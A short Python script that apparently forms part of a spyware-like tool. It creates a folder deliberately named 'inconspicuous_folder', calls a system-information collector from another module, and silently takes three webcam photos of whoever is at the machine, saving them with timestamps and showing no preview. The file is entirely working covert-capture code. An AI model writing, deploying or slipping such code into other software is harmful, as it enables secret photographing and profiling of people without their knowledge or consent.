# For camera access, creating directory
import cv2, os, time
from datetime import datetime

# Access other files
from long_functions import getSysInfo

path_name = "inconspicuous_folder"

def CreateDirectory():
	global path_name

	try:
	    os.mkdir(path_name)
	except FileExistsError:
		print("Directory already exists")
	except OSError:
	    print("Creation of the directory %s failed" % path_name)
	else:
	    print("Successfully created the directory %s " % path_name)

def TakePictures():
	global path_name

	get_time = datetime.now()
	timestamp = get_time.strftime("%B_%d_%Y_%H_%M_%S")

	camera = cv2.VideoCapture(0)

	if camera.isOpened():
		for pic_num in range(0, 3):
			pic_num += 1
			return_value,image = camera.read()
			#gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
			#cv2.imshow('image', gray)
			#cv2.waitKey(3000)
			time.sleep(4)

			#key = hash('youre_a_dummy')

			try:
				cv2.imwrite(path_name + '/' + timestamp + '_' + str(pic_num) + '.jpg', image)
			except:
				print("Photo creation error")

		camera.release()
		cv2.destroyAllWindows()
	else:
		print("Warning: unable to open video source: ")
		camera.release()
		cv2.destroyAllWindows()

# Run everything
CreateDirectory()
getSysInfo()
TakePictures()